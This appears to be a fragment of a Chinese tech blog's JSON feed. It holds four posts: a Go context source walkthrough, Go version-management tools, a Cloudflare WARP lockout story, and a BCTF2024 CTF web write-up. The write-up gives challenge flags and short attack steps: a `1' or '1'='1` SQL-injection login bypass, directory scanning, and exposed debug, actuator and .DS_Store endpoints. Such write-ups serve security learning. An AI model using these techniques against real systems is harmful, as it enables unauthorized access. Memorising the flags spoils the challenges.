的请求范围数据，而不是用于向函数传递可选参数。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 提供的 key 必须具有可比性，且不应是字符串或任何其他内置类型，以避免使用 context 的软件包之间发生冲突。</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// WithValue 的用户应为 key 定义自己的类型。为避免在赋值给 interface &#123;&#125; 时进行分配，context key 通常采用具体的 struct &#123;&#125; 类型。或者，导出 context key 变量的静态类型应为指针或接口。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">WithValue</span><span class=\"token punctuation\">(</span>parent Context<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> val any<span class=\"token punctuation\">)</span> Context <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span> parent <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">panic</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cannot create context from nil parent\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> key <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token function\">panic</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"nil key\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>reflectlite<span class=\"token punctuation\">.</span><span class=\"token function\">TypeOf</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Comparable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token function\">panic</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"key is not comparable\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">&amp;</span>valueCtx<span class=\"token punctuation\">&#123;</span>parent<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>valueCtx<span class=\"token punctuation\">)</span> <span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">contextName</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\".WithValue(type \"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        reflectlite<span class=\"token punctuation\">.</span><span class=\"token function\">TypeOf</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token string\">\", val \"</span> <span class=\"token operator\">+</span> <span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>val<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\")\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 取值</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>valueCtx<span class=\"token punctuation\">)</span> <span class=\"token function\">Value</span><span class=\"token punctuation\">(</span>key any<span class=\"token punctuation\">)</span> any <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>key <span class=\"token operator\">==</span> key <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">.</span>val</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token comment\">// 递归向父类查找</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">value</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">value</span><span class=\"token punctuation\">(</span>c Context<span class=\"token punctuation\">,</span> key any<span class=\"token punctuation\">)</span> any <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">switch</span> ctx <span class=\"token operator\">:=</span> c<span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">type</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token operator\">*</span>valueCtx<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">if</span> key <span class=\"token operator\">==</span> ctx<span class=\"token punctuation\">.</span>key <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token keyword\">return</span> ctx<span class=\"token punctuation\">.</span>val</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            c <span class=\"token operator\">=</span> ctx<span class=\"token punctuation\">.</span>Context</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token operator\">*</span>cancelCtx<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">if</span> key <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>cancelCtxKey <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token keyword\">return</span> c</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            c <span class=\"token operator\">=</span> ctx<span class=\"token punctuation\">.</span>Context</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">case</span> withoutCancelCtx<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token keyword\">if</span> key <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>cancelCtxKey <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                <span class=\"token comment\">// This implements Cause(ctx) == nil</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token comment\">// when ctx is created using WithoutCancel.</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            c <span class=\"token operator\">=</span> ctx<span class=\"token punctuation\">.</span>c</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token operator\">*</span>timerCtx<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token keyword\">if</span> key <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>cancelCtxKey <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token operator\">&amp;</span>ctx<span class=\"token punctuation\">.</span>cancelCtx</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            c <span class=\"token operator\">=</span> ctx<span class=\"token punctuation\">.</span>Context</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">case</span> backgroundCtx<span class=\"token punctuation\">,</span> todoCtx<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">Value</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "计算机科学",
                "GO",
                "Lib",
                "GO"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2025/Go/go_version_control/",
            "url": "https://blog.twelveeee.top/2025/Go/go_version_control/",
            "title": "golang 多版本环境控制",
            "date_published": "2025-02-28T09:00:00.000Z",
            "content_html": "<h1 id=\"golang-多版本环境控制\"><a class=\"anchor\" href=\"#golang-多版本环境控制\">#</a> golang 多版本环境控制</h1>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>新老项目很多，但是不同项目有不同的 go 版本，在同一个环境管理 go 相当麻烦，后面看文档发现了别人推荐的版本控制工具，基本无感管理 go 版本</p>\n<h1 id=\"smart-go-dl\"><a class=\"anchor\" href=\"#smart-go-dl\">#</a> smart-go-dl</h1>\n<p>Go 多版本管理辅助工具，可以快速安装 Go (次要版本) 的最新版本，并对过期版本进行清理。</p>\n<p>项目地址： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZzZ28vc21hcnQtZ28tZGw=\">https://github.com/fsgo/smart-go-dl</span></p>\n<h2 id=\"安装\"><a class=\"anchor\" href=\"#安装\">#</a> <strong>安装</strong></h2>\n<p>有 go 环境 使用 go install 安装</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>go <span class=\"token function\">install</span> github.com/fsgo/smart-go-dl@latest</pre></td></tr></table></figure><p>无 go 环境 直接下载二进制文件运行</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZzZ28vc21hcnQtZ28tZGwvcmVsZWFzZXM=\">https://github.com/fsgo/smart-go-dl/releases</span></p>\n<h2 id=\"配置环境变量\"><a class=\"anchor\" href=\"#配置环境变量\">#</a> <strong>配置环境变量</strong></h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">GOBIN</span><span class=\"token operator\">=</span><span class=\"token environment constant\">$HOME</span>/go/bin   <span class=\"token comment\"># go install 安装的二进制文件所在目录，go1.x 命令也将安装到此目录</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span><span class=\"token variable\">$GOBIN</span><span class=\"token builtin class-name\">:</span><span class=\"token environment constant\">$PATH</span>    <span class=\"token comment\"># 可以直接在任意位置使用 GOBIN 目录下的所有命令</span></pre></td></tr></table></figure><h2 id=\"安装不同的go版本\"><a class=\"anchor\" href=\"#安装不同的go版本\">#</a> 安装不同的 go 版本</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>smart-go-dl <span class=\"token function\">install</span> go1.22.5</pre></td></tr></table></figure><h1 id=\"bin-auto-switcher\"><a class=\"anchor\" href=\"#bin-auto-switcher\">#</a> bin-auto-switcher</h1>\n<p>Go 自动切换 go 的版本</p>\n<p>项目地址： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZzZ28vYmluLWF1dG8tc3dpdGNoZXI=\">https://github.com/fsgo/bin-auto-switcher</span></p>\n<h2 id=\"安装-2\"><a class=\"anchor\" href=\"#安装-2\">#</a> 安装</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>go <span class=\"token function\">install</span> github.com/fsgo/bin-auto-switcher/bas@latest</pre></td></tr></table></figure><h2 id=\"配置\"><a class=\"anchor\" href=\"#配置\">#</a> 配置</h2>\n<p>让 bas 替换 go</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> ~/go/bin/</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 备份 </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">mv</span> go go_backup</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 替换 go</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">ln</span> <span class=\"token parameter variable\">-s</span> bas go</pre></td></tr></table></figure><p>新增配置  <code>~/.config/bas/go.toml</code></p>\n<figure class=\"highlight toml\"><figcaption data-lang=\"TOML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token table class-name\">Rules</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token key property\">Cmd</span> <span class=\"token punctuation\">=</span> <span class=\"token string\">\"go.latest\"</span>          <span class=\"token comment\"># 默认执行命令 (必填) 如果命令不存在不报错</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token table class-name\">Rules.Spec</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token key property\">GoVersionFile</span> <span class=\"token punctuation\">=</span> <span class=\"token string\">\"go.mod\"</span>  <span class=\"token comment\">#判断 go 版本的文件</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token key property\">GoWork</span> <span class=\"token punctuation\">=</span> <span class=\"token string\">\"auto\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 单独指定哪个目录使用的 go 版本</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token table class-name\">Rules</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token key property\">Dir</span> <span class=\"token punctuation\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"~/workspace/fsgo/myserver\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token key property\">Cmd</span> <span class=\"token punctuation\">=</span> <span class=\"token string\">\"go1.19\"</span></pre></td></tr></table></figure><p>bas 的本质是替换了 go 的命令，然后通过读取各种配置，比如 go.mod 去判断应该执行的 go 的版本</p>\n<h1 id=\"演示\"><a class=\"anchor\" href=\"#演示\">#</a> 演示</h1>\n<p>bin-auto-switch go 版本是 go1.22</p>\n<p>ddns-go go 版本是 go1.20</p>\n<p>直接运行 go 命令就能直接使用</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20250228191747816.png\" alt=\"image-20250228191747816\" /></p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20250228191902509.png\" alt=\"image-20250228191902509\" /></p>\n",
            "tags": [
                "计算机科学",
                "GO",
                "GO",
                "github"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2025/Project/cloudflare-connect-dodge-a-bullet/",
            "url": "https://blog.twelveeee.top/2025/Project/cloudflare-connect-dodge-a-bullet/",
            "title": "cloudflare connect 踩坑记录",
            "date_published": "2025-02-26T09:00:00.000Z",
            "content_html": "<h1 id=\"cloudflare-connect-踩坑记录\"><a class=\"anchor\" href=\"#cloudflare-connect-踩坑记录\">#</a> cloudflare connect 踩坑记录</h1>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>身边有一台没有公网 ip 的 ubuntu 小主机，没办法接入 beszel，没办法监控 cpu 和网络情况。</p>\n<p>所以想要搭建一个大内网，把所有的机器都连进这个内网里面。</p>\n<h1 id=\"操作流程\"><a class=\"anchor\" href=\"#操作流程\">#</a> 操作流程</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXJzLmNsb3VkZmxhcmUuY29tL2Nsb3VkZmxhcmUtb25lL2Nvbm5lY3Rpb25zL2Nvbm5lY3QtbmV0d29ya3MvcHJpdmF0ZS1uZXQvd2FycC1jb25uZWN0b3Ivc2l0ZS10by1zaXRlLyM0LXJvdXRlLXRyYWZmaWMtZnJvbS1zdWJuZXQtdG8td2FycC1jb25uZWN0b3I=\">https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/private-net/warp-connector/site-to-site/#4-route-traffic-from-subnet-to-warp-connector</span></p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20250226165950706.png\" alt=\"image-20250226165950706\" /></p>\n<p>大概流程就是，两边都开了这个 warp connect 就能通过分配的 ip 进行互连。</p>\n<p>然后按照官方文档操作到第三步的时候</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20250226170156367.png\" alt=\"image-20250226170156367\" /></p>\n<p>第三步提示可能会导致失去连接，我以为失去连接，可能是重启网络什么之类的，一会就恢复了。事实证明我是如此的天真。</p>\n<p>当我输入  <code>warp-cli connect</code>   操作回车之后，ssh 断了，然后我就去操作第二台机器的 <code>warp</code>  了，等我第二台机器也断了之后，回来翻第一台机器。。日了，ssh 不上去，ping 也 ping 不通，完蛋。</p>\n<h1 id=\"恢复过程\"><a class=\"anchor\" href=\"#恢复过程\">#</a> 恢复过程</h1>\n<p>然后翻到这个帖子</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudjJleC5jb20vdC8xMDkxMzM1\">https://www.v2ex.com/t/1091335</span></p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20250226170803925.png\" alt=\"image-20250226170803925\" /></p>\n<p>根据大佬们的建议，使用 华为云的 vnc 进入了机器，kill 掉了 <code>warp-cli</code></p>\n<p>那么问题来了，我的物理机呢？</p>\n<p>等我下班回到家之后，路由器显示的 ip，ping 也 ping 不通，ssh 不上去，我也没设置 vnc，</p>\n<p>最后。。</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/26722321A309DA3C503DA1E72FEA49A8.jpg\" alt=\"26722321A309DA3C503DA1E72FEA49A8\" /></p>\n<p>让舍友帮忙搬个显示器，，连了半天。。。</p>\n<p>连上去直接  <code>apt remove cloudflare-warp</code></p>\n<p>虽然已经是 12 天前的事情了，今天终于有空吐槽一下。</p>\n<p>最后</p>\n<p>不要在 sudo 环境执行自己都不知道会发生什么事情的命令</p>\n<p>🙏🙏🙏</p>\n",
            "tags": [
                "计算机科学",
                "Project",
                "Cloudflare"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2024/CTF/BCTF2024/web_01/",
            "url": "https://blog.twelveeee.top/2024/CTF/BCTF2024/web_01/",
            "title": "BCTF2024-WEB-01~08",
            "date_published": "2024-10-12T11:00:00.000Z",
            "content_html": "<h1 id=\"bctf2024-web-01~08\"><a class=\"anchor\" href=\"#bctf2024-web-01~08\">#</a> BCTF2024-WEB-01~08</h1>\n<h2 id=\"万能密码\"><a class=\"anchor\" href=\"#万能密码\">#</a> 万能密码</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>小明是一个运维工程师，他竟然忘记了管理台的密码，看着系统登录框，他陷入了沉思</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5leGFtcGxlLmNvbQ==\">www.example.com</span></p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{9b29c64d7d5c05103510474792e59a67}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code>sql 注入\n密码输入 `1' or '1'='1`\n</code></pre>\n</div></details>\n<h2 id=\"未授权访问\"><a class=\"anchor\" href=\"#未授权访问\">#</a> 未授权访问</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>小明是一个研发工程师，有一次他接到一个需求，负责为 http://example.com:8080/ 管理平台添加一个接口，写个接口的事，实现功能逻辑很简单，但不要忘了安全授权</p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{ac07a1308c5580fbbe57c16afdad1ae3}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<p>js 代码中有一段这个</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">,</span> <span class=\"token function-variable function\">Y</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token constant\">D</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token literal-property property\">url</span><span class=\"token operator\">:</span> <span class=\"token string\">\"http://\"</span> <span class=\"token operator\">+</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>host <span class=\"token operator\">+</span> <span class=\"token string\">\"/api/userinfo?id=\"</span> <span class=\"token operator\">+</span> t<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token literal-property property\">method</span><span class=\"token operator\">:</span> <span class=\"token string\">\"get\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>请求 <span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29tL2FwaS91c2VyaW5mbz9pZD0w\">http://example.com/api/userinfo?id=0</span></p>\n</div></details>\n<h2 id=\"前端认证\"><a class=\"anchor\" href=\"#前端认证\">#</a> 前端认证</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>小明是一个运维工程师，他竟然忘记了管理台 http://example.com/#/login 的密码，看着系统登录框，他又陷入了沉思</p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{4bfc0fb4b27629d86daa293e61657294}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<p>劫持前端将 返回 code 改为 “0” 即可</p>\n</div></details>\n<h2 id=\"github\"><a class=\"anchor\" href=\"#github\">#</a> github</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>小雅是一个研发工程师，有一天他接到了一个 bctf2024 的一个游戏项目，由于项目紧迫，他想回家后继续努力工作，多么勤劳的程序猿啊，然而他习惯性的登录了 github</p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{03321386129b425e2c190baf810f8e44}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<p>通过搜索 BCTF2024，找到仓库，再 commit 中记录有 flag</p>\n</div></details>\n<h2 id=\"线上调试信息\"><a class=\"anchor\" href=\"#线上调试信息\">#</a> 线上调试信息</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>小韩是一个研发工程师，一天他在解决一个线上 http://example.com/#/login bug，于是开启了调试信息，上线后，忘了关了。。。。。</p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{1101748de24f770b3ea3fe92af73450b}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code># 扫url\nwscan --log-level=debug ws  --plug=dirscan --basic-crawler http://example.com:8080/ --html-output=./wscan_scan_result.html\n\n# 发现 http://example.com/debug/pprof/\n# http://example.com/debug/pprof/cmdline?debug=1\n\n</code></pre>\n</div></details>\n<h2 id=\"不安全配置\"><a class=\"anchor\" href=\"#不安全配置\">#</a> 不安全配置</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>小丁是一个研发工程师，一天他为了 http://example.com:8080/#/login 监控服务方便，他配置了 actuator</p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{75b8eecf3ff828a958d20b03c8077ddc}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code># 扫一下url\nwscan --log-level=debug ws  --plug=dirscan --basic-crawler http://example.com/api/ --html-output=./wscan_scan_result_api.html\n\n</code></pre>\n<p>找到 /api/actuator<br />\nheapdump 用 idea 打开，有 flag</p>\n</div></details>\n<h2 id=\"不可以爬取的路径\"><a class=\"anchor\" href=\"#不可以爬取的路径\">#</a> 不可以爬取的路径</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>小夏上线了他的网站 http://example.com/#/login</p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{aa2646a667ee1cd83235786dccef4a26}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code>http://example.com/robots.txt\nUser-agent: *\nDisallow: flag_1s_3ere\n\nhttp://example.com/flag_1s_3ere\n</code></pre>\n</div></details>\n<h2 id=\"线上备份\"><a class=\"anchor\" href=\"#线上备份\">#</a> 线上备份</h2>\n<p><strong>题目</strong></p>\n<blockquote>\n<p>小 S 是一个运维工程师，一天他接到业务需求，进行线上 http://example.com/#/login 代码备份，然后就悲剧了</p>\n</blockquote>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{93ac40e0ceda197913f46d78c9d4715b}</span></p>\n</div></details>\n<details class=\"success\"><summary>题解</summary><div>\n<pre><code># 扫一下\nwscan --log-level=debug ws  --plug=dirscan --basic-crawler http://example.com/ --html-output=./wscan_scan_result.html\n</code></pre>\n<p>有个 .DS_Store 文件<br />\n <code>ttps://github.com/lijiejie/ds_store_exp</code>  用这个打开<br />\n python3 ds_store_exp.py <span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29tLy5EU19TdG9yZQ==\">http://example.com/.DS_Store</span></p>\n<p>找到目录<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29tL2Fzc2V0cy56aXA=\"> http://example.com/assets.zip</span></p>\n<p>打开有个 flag</p>\n</div></details>\n",
            "tags": [
                "计算机科学",
                "CTF",
                "BCTF2024",
                "CTF"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2024/CTF/BCTF2024/misc/",
